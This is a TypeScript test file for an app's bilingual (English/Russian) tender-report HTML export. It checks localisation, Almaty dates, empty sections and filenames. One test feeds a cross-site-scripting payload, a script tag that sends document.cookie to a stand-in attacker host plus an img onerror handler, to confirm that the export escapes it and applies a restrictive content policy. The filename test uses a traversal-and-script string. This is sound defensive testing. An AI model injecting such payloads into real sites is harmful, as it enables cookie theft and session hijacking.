import assert from "node:assert/strict";
import test from "node:test";
import { COMPANY_EVIDENCE, DEMO_COMPANY, SAMPLE_TENDER, SAMPLE_TENDER_RU } from "../lib/demo-data";
import { translateCompanyEvidence } from "../lib/i18n";
import { analyzeDemoTender } from "../lib/mock-analysis";
import { createReportHtml, escapeReportHtml, reportFilename } from "../lib/report-export";
import type { Assessment } from "../lib/types";

const analyzedAt = "2026-09-24T19:35:00.000Z"; // 25 September, 00:35 in Almaty.

for (const locale of ["en", "ru"] as const) {
  test(`export contains every assessment section and source quote in ${locale}`, () => {
    const assessment = analyzeDemoTender(locale === "ru" ? SAMPLE_TENDER_RU : SAMPLE_TENDER, locale);
    const html = createReportHtml({ assessment, mode: "demo", analyzedAt, locale });
    assert.ok(html.startsWith("<!doctype html>"));
    assert.ok(html.includes(`<html lang="${locale}">`));
    assert.ok(html.includes(DEMO_COMPANY.name));
    assert.ok(html.includes(locale === "ru" ? "Вымышленная компания" : "Fictional company"));
    assert.ok(html.includes(locale === "ru" ? "ДЕМОРЕЖИМ · Без вызова ИИ" : "DEMO MODE · No live AI call"));
    assert.ok(html.includes(locale === "ru" ? "Высокий риск" : "High risk"));
    assert.ok(html.includes(escapeReportHtml(assessment.summary)));
    assert.ok(html.includes(escapeReportHtml(assessment.disclaimer)));
    for (const id of ["requirements", "deadlines", "actions", "alerts"]) assert.ok(html.includes(`<section id="${id}">`));
    for (const requirement of assessment.requirements) {
      assert.ok(html.includes(escapeReportHtml(requirement.title)));
      assert.ok(html.includes(escapeReportHtml(requirement.tenderEvidence)));
      assert.ok(html.includes(escapeReportHtml(translateCompanyEvidence(requirement.companyEvidence, locale))));
      assert.ok(html.includes(escapeReportHtml(requirement.explanation)));
    }
    for (const deadline of assessment.deadlines) {
      assert.ok(html.includes(escapeReportHtml(deadline.title)));
      assert.ok(html.includes(escapeReportHtml(deadline.tenderEvidence)));
    }
    for (const action of assessment.actions) {
      assert.ok(html.includes(escapeReportHtml(action.title)));
      assert.ok(html.includes(escapeReportHtml(action.description)));
    }
    for (const alert of assessment.alerts) assert.ok(html.includes(escapeReportHtml(alert.title)));
    assert.ok(html.includes(locale === "ru" ? "25 сентября 2026" : "25 September 2026"));
    assert.ok(html.includes("00:35"));
    assert.ok(html.includes("UTC+5"));
    assert.ok(html.includes(locale === "ru" ? "Черновик · не запланирован" : "Draft · not scheduled"));
    assert.ok(html.includes("@media print"));
  });
}

test("Russian export translates known company evidence but preserves English tender quotations", () => {
  const assessment = analyzeDemoTender(SAMPLE_TENDER, "ru");
  const html = createReportHtml({ assessment, mode: "live", analyzedAt, locale: "ru" });
  assert.ok(html.includes("АНАЛИЗ С ПОМОЩЬЮ ИИ"));
  assert.equal(html.includes("ДЕМОРЕЖИМ · Без вызова ИИ"), false);
  assert.ok(html.includes("Лицензия на строительство"));
  assert.equal(html.includes(escapeReportHtml(COMPANY_EVIDENCE["construction-license"])), false);
  for (const requirement of assessment.requirements) assert.ok(html.includes(escapeReportHtml(requirement.tenderEvidence)));
  assert.ok(html.includes("Официальное право на участие не проверено"));
});

test("all untrusted report text is escaped, with no executable source markup or network resources", () => {
  const hostile = `</p><script>fetch('https://attacker.invalid/?secret='+document.cookie)</script><img src="https://attacker.invalid/pixel" onerror="alert(1)">& ' \"`;
  const assessment: Assessment = {
    summary: hostile,
    overallRisk: "unknown",
    officialEligibilityVerified: false,
    requirements: [{ title: hostile, status: "unknown", tenderEvidence: hostile, companyEvidence: hostile, explanation: hostile }],
    deadlines: [{ title: hostile, date: "2026-10-01T10:00:00+05:00", tenderEvidence: hostile }],
    actions: [{ title: hostile, description: hostile, priority: "high" }],
    alerts: [{ title: hostile, scheduledAt: "2026-09-30T10:00:00+05:00", status: "draft" }],
    disclaimer: hostile,
  };
  const html = createReportHtml({ assessment, mode: "live", analyzedAt, locale: "en" });
  assert.equal(html.includes(hostile), false);
  assert.equal(html.split(escapeReportHtml(hostile)).length - 1, 11, "Each dynamic text field must be escaped without omitting any report content");
  assert.doesNotMatch(html, /<script\b|<img\b|<iframe\b|<link\b|<form\b|<base\b/i);
  assert.equal([...html.matchAll(/\son\w+="[^\"]*"/g)].map(match => match[0]).join(""), ' onclick="window.print()"');
  assert.ok(html.includes("default-src 'none'"));
  assert.ok(html.includes("connect-src 'none'"));
  assert.ok(html.includes("form-action 'none'"));
  assert.equal(escapeReportHtml(`<>&\"'`), "&lt;&gt;&amp;&quot;&#39;");
});

test("empty assessments retain every section with useful localized empty states", () => {
  for (const locale of ["ru", "en"] as const) {
    const assessment = analyzeDemoTender("No relevant tender requirements or dates are present.", locale);
    assessment.actions = [];
    const html = createReportHtml({ assessment, mode: "demo", analyzedAt: "invalid", locale });
    assert.equal((html.match(/<section id=/g) ?? []).length, 4);
    assert.equal((html.match(/class="empty"/g) ?? []).length, 4);
    assert.ok(html.includes(locale === "ru" ? "Дату нужно проверить" : "Date requires verification"));
  }
});

test("download filename uses Almaty calendar date and excludes arbitrary input", () => {
  assert.equal(reportFilename({ analyzedAt, locale: "ru" }), "saqtender-report-ru-2026-09-25.html");
  assert.equal(reportFilename({ analyzedAt, locale: "en" }), "saqtender-report-en-2026-09-25.html");
  assert.equal(reportFilename({ analyzedAt: '../../<script>alert(1)</script>', locale: "ru" }), "saqtender-report-ru-undated.html");
});
